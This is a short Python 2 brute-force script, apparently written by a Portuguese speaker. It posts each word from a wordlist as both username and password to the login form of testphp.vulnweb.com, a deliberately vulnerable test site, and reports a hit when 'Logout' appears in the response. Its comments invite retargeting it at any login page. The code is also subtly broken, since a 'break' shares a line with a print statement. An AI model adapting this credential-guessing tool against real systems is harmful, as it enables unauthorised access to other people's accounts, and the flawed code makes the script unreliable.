import requests

try:
    url = 'http://testphp.vulnweb.com/userinfo.php' # POST method URL of your target

    arq = open('dicionario.txt') # Your wordlist
    lines = arq.readlines()

    for line in lines:
        dados = {'uname': line, # User data form of your attack page
                 'pass': line}  # Pass data form of your attack page

        resposta = requests.post(url, data=dados)

        if "Logout" in resposta.text:
            print 'User: ', line, 'Pass: ', line, "\nWOW, Found\n", 'Code:', resposta.status_code break
        else:
            print 'User: ', line, 'Pass: ', line, "\nBAD, Not Found\n"
except:
    print 'WARING:' \
          'Open the code with a text editor of your choice ' \
          'and edit the code in the lines where the comments are for your ' \
          'particular situation!'
